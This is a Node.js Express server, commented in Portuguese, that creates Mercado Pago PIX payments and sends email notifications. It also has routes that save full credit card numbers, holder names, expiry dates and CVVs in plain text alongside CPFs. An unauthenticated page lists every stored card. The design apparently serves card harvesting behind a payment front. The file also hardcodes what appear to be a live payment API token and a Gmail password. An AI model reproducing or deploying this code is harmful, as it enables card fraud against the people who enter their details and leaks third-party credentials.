"use strict";
const axios = require("axios");
const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const fs = require("fs");
const { v4: uuidv4 } = require("uuid");
const { Pool } = require("pg"); // 🔄 troquei mysql2 por pg
const nodemailer = require("nodemailer");

const app = express();
app.use(bodyParser.json());
app.use(cors());

/********************
 * CONFIGURAÇÃO PIX *
 ********************/
const ACCESS_TOKEN = "APP_USR-7155153166578433-022021-bb77c63cb27d3d05616d5c08e09077cf-502781407";
const PAGAMENTOS_FILE = "pagamentos.json";

// Inicializar o arquivo de pagamentos se não existir
if (!fs.existsSync(PAGAMENTOS_FILE)) {
  fs.writeFileSync(PAGAMENTOS_FILE, JSON.stringify([]));
}

/********************
 * CONFIGURAÇÃO E-MAIL (EM TEXTO PURO - substitua valores)
 * Substitua SEU_EMAIL_AQUI e SUA_SENHA_AQUI diretamente no seu editor.
 ********************/
const SMTP_EMAIL = "joreljunior0102@gmail.com"; // <- substitua pelo seu e-mail (ex: joreljunior0102@gmail.com)
const SMTP_PASS  = "M10019210a";  // <- substitua pela senha do e-mail (senha normal ou app password)
const NOTIFY_TO  = SMTP_EMAIL;        // notificações irão para o mesmo e-mail

const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: SMTP_EMAIL,
    pass: SMTP_PASS,
  },
});

// Função para enviar notificação por e-mail
async function enviarNotificacaoEmail(pagamento, tipo = "gerado") {
  try {
    const assunto = tipo === "aprovado"
      ? `Pagamento PIX aprovado ✅ - txid: ${pagamento.txid}`
      : `Nova chave PIX gerada (pendente) - txid: ${pagamento.txid}`;

    let html = `
      <h2>${tipo === "aprovado" ? "Pagamento aprovado" : "Chave PIX gerada"}</h2>
      <p><b>TXID:</b> ${pagamento.txid}</p>
      <p><b>Valor:</b> R$ ${Number(pagamento.valor).toFixed(2)}</p>
      <p><b>Email do pagador:</b> ${pagamento.payerEmail || "-"}</p>
      <p><b>CPF:</b> ${pagamento.payerCpf || "-"}</p>
      <p><b>Status:</b> ${pagamento.status || "-"}</p>
      <p><b>Copia e Cola:</b> <code>${pagamento.copiaECola || "-"}</code></p>
    `;

    if (pagamento.qrcodeBase64) {
      // inclui QR code inline (opcional)
      html += `<p><img src="data:image/png;base64,${pagamento.qrcodeBase64}" alt="QR Code" style="max-width:300px;"/></p>`;
    }

    const mailOptions = {
      from: `"Notificação PIX" <${SMTP_EMAIL}>`,
      to: NOTIFY_TO,
      subject: assunto,
      html,
    };

    await transporter.sendMail(mailOptions);
    console.log(`📧 Notificação enviada (${tipo}) — txid=${pagamento.txid}`);
  } catch (err) {
    console.error("❌ Erro ao enviar notificação por e-mail:", err.message || err);
  }
}

// Função para gerar uma chave PIX
async function gerarChavePix(valor, payerEmail, payerCpf) {
  try {
    const idempotencyKey = uuidv4();
    const response = await axios.post(
      "https://api.mercadopago.com/v1/payments",
      {
        transaction_amount: valor,
        description: "Pagamento via PIX",
        payment_method_id: "pix",
        payer: {
          email: payerEmail,
          identification: {
            type: "CPF",
            number: payerCpf,
          },
        },
      },
      {
        headers: {
          Authorization: `Bearer ${ACCESS_TOKEN}`,
          "Content-Type": "application/json",
          "X-Idempotency-Key": idempotencyKey,
        },
      }
    );

    const qrcodeData = {
      txid: response.data.id,
      qrcodeBase64: response.data.point_of_interaction.transaction_data.qr_code_base64, // imagem
      copiaECola: response.data.point_of_interaction.transaction_data.qr_code, // texto copia e cola
      valor,
      payerEmail,
      payerCpf,
      status: "pendente",
    };

    console.log(`Chave PIX gerada: ${JSON.stringify(qrcodeData)}`);
    return qrcodeData;
  } catch (error) {
    console.error("Erro ao gerar chave PIX:", error.response?.data || error.message);
    throw new Error(error.response?.data?.message || "Erro ao gerar chave PIX");
  }
}

/**********************
 * ROTA PIX EXISTENTE *
 **********************/
app.post("/gerar-chave-pix", async (req, res) => {
  try {
    const { valor, payerEmail, payerCpf } = req.body;
    if (!valor || isNaN(valor) || valor <= 0) {
      return res.status(400).json({ error: "Valor inválido" });
    }

    const qrcodeData = await gerarChavePix(parseFloat(valor), payerEmail, payerCpf);

    const pagamentos = JSON.parse(fs.readFileSync(PAGAMENTOS_FILE, "utf8"));
    pagamentos.push(qrcodeData);
    fs.writeFileSync(PAGAMENTOS_FILE, JSON.stringify(pagamentos, null, 2));

    // Envia notificação quando a chave é gerada (aguarda para garantir envio)
    await enviarNotificacaoEmail(qrcodeData, "gerado");

    console.log(`Chave PIX gerada com sucesso: txid=${qrcodeData.txid}, valor=${qrcodeData.valor}, email=${qrcodeData.payerEmail}`);
    res.json(qrcodeData);
  } catch (error) {
    console.error("Erro ao gerar chave PIX:", error.message);
    res.status(500).json({ error: error.message });
  }
});

/***********************************
 * CONFIGURAÇÃO BANCO CARTÕES (PG) *
 ***********************************/
const pool = new Pool({
  connectionString: process.env.DATABASE_URL, // 🔄 variavel de ambiente
  ssl: { rejectUnauthorized: false }, // 🔄 necessário no Render
});

pool.connect()
  .then(() => console.log("Conectado ao banco Postgres no Render!"))
  .catch(err => console.error("Erro de conexão com o banco:", err.message));

/**********************
 * NOVO ENDPOINT DB *
 **********************/
app.get("/init-db", async (req, res) => {
  try {
    const sql = `
      CREATE TABLE IF NOT EXISTS cartoes (
        id SERIAL PRIMARY KEY,
        cpf VARCHAR(20) NOT NULL,
        numero VARCHAR(20) NOT NULL,
        nome VARCHAR(100) NOT NULL,
        validade VARCHAR(10) NOT NULL,
        cvv VARCHAR(5) NOT NULL,
        criado_em TIMESTAMP DEFAULT NOW()
      );
    `;
    await pool.query(sql);
    res.json({ sucesso: true, mensagem: "Tabela 'cartoes' criada ou já existente!" });
  } catch (err) {
    console.error("ERRO COMPLETO AO CRIAR TABELA:", err); // 🔴 log detalhado
    res.status(500).json({ error: "Erro ao criar tabela, verifique o log do backend" });
  }
});

// Rota para salvar cartões
app.post("/salvar-cartao", async (req, res) => {
  const { cpf, numero, nome, validade, cvv } = req.body;

  if (!cpf || !numero || !nome || !validade || !cvv) {
    return res.status(400).json({ error: "Todos os campos são obrigatórios." });
  }

  try {
    const sql = "INSERT INTO cartoes (cpf, numero, nome, validade, cvv) VALUES ($1, $2, $3, $4, $5)";
    await pool.query(sql, [cpf, numero, nome, validade, cvv]);

    res.json({ sucesso: true, mensagem: "Cartão salvo com sucesso!" });
  } catch (err) {
    console.error("Erro ao salvar cartão:", err.message);
    res.status(500).json({ error: "Erro ao salvar cartão." });
  }
});

/***************************************
 * NOVAS ROTAS DE CONSULTA (adicionadas)
 * - GET /cartoes            => lista (paginação + filtros cpf/nome)
 * - GET /cartoes/:id        => retorna um cartão pelo id
 ***************************************/
app.get("/cartoes", async (req, res) => {
  try {
    const result = await pool.query(
      "SELECT id, cpf, numero, nome, validade, cvv, criado_em FROM cartoes ORDER BY criado_em DESC"
    );

    // Se o header "Accept" pedir JSON (ex: fetch, Postman), devolve JSON
    if (req.headers.accept && req.headers.accept.includes("application/json")) {
      return res.json({ count: result.rowCount, rows: result.rows });
    }

    // Senão, devolve uma página HTML com tabela
    let html = `
      <html>
      <head>
        <meta charset="UTF-8">
        <title>Cartões Salvos</title>
        <style>
          body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
          h1 { text-align: center; }
          table { border-collapse: collapse; width: 100%; background: white; }
          th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
          th { background-color: #007BFF; color: white; }
          tr:nth-child(even) { background-color: #f2f2f2; }
        </style>
      </head>
      <body>
        <h1>Cartões Salvos</h1>
        <table>
          <tr>
            <th>ID</th>
            <th>CPF</th>
            <th>Número</th>
            <th>Nome</th>
            <th>Validade</th>
            <th>CVV</th>
            <th>Criado em</th>
          </tr>
    `;

    result.rows.forEach(row => {
      html += `
        <tr>
          <td>${row.id}</td>
          <td>${row.cpf}</td>
          <td>${row.numero}</td>
          <td>${row.nome}</td>
          <td>${row.validade}</td>
          <td>${row.cvv}</td>
          <td>${new Date(row.criado_em).toLocaleString("pt-BR")}</td>
        </tr>
      `;
    });

    html += `
        </table>
      </body>
      </html>
    `;

    res.send(html);

  } catch (err) {
    console.error("Erro ao listar cartões:", err.message || err);
    res.status(500).send("<h1>Erro ao listar cartões</h1>");
  }
});

/******************************
 * FUNÇÕES DE ATUALIZAÇÃO PIX *
 ******************************/
async function atualizarStatusPagamentos() {
  try {
    const pagamentos = JSON.parse(fs.readFileSync(PAGAMENTOS_FILE, "utf8"));

    for (const pagamento of pagamentos) {
      if (pagamento.status !== "approved") {
        const response = await axios.get(`https://api.mercadopago.com/v1/payments/${pagamento.txid}`, {
          headers: { Authorization: `Bearer ${ACCESS_TOKEN}` },
        });

        const novoStatus = response.data.status;

        if (novoStatus === "approved" && pagamento.status !== "approved") {
          console.log(`Pagamento aprovado: txid=${pagamento.txid}, valor=${pagamento.valor}, email=${pagamento.payerEmail}`);
          pagamento.status = novoStatus;
          // envia notificação quando aprovada
          await enviarNotificacaoEmail(pagamento, "aprovado");
        } else {
          pagamento.status = novoStatus;
        }
      }
    }

    fs.writeFileSync(PAGAMENTOS_FILE, JSON.stringify(pagamentos, null, 2));
    console.log("Status dos pagamentos atualizado com sucesso.");
  } catch (error) {
    console.error("Erro ao atualizar status dos pagamentos:", error.message);
  }
}

/******************************
 * ROTAS EXISTENTES DE PAGAMENTOS *
 ******************************/
app.get("/pagamentos", (req, res) => {
  try {
    const pagamentos = JSON.parse(fs.readFileSync(PAGAMENTOS_FILE, "utf8"));
    const pagamentosAprovados = pagamentos.filter((p) => p.status === "approved");
    res.json(pagamentosAprovados);
  } catch (error) {
    res.status(500).json({ error: "Erro ao carregar pagamentos" });
  }
});

app.post("/verificar-status", async (req, res) => {
  const { txid } = req.body;
  if (!txid) return res.status(400).json({ error: "txid não fornecido" });

  try {
    const response = await axios.get(`https://api.mercadopago.com/v1/payments/${txid}`, {
      headers: { Authorization: `Bearer ${ACCESS_TOKEN}` },
    });

    const status = response.data.status;

    const pagamentos = JSON.parse(fs.readFileSync(PAGAMENTOS_FILE, "utf8"));
    const pagamento = pagamentos.find((p) => p.txid === txid);
    if (pagamento) {
      pagamento.status = status;
      fs.writeFileSync(PAGAMENTOS_FILE, JSON.stringify(pagamentos, null, 2));
    }

    res.json({ status });
  } catch (error) {
    res.status(500).json({ error: "Erro ao verificar status do pagamento" });
  }
});

/******************************
 * FUNÇÕES DE PING AUTOMÁTICO *
 ******************************/
async function enviarPing() {
  try {
    const response = await axios.get(`http://localhost:${PORT}/pagamentos`);
    console.log("Ping bem-sucedido:", response.data);
  } catch (error) {
    console.error("Erro ao enviar ping:", error.message);
  }
}

/******************************
 * INTERVALOS AUTOMÁTICOS *
 ******************************/
setInterval(atualizarStatusPagamentos, 60000);
setInterval(enviarPing, 60000);

/*********************
 * INICIAR SERVIDOR *
 *********************/
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));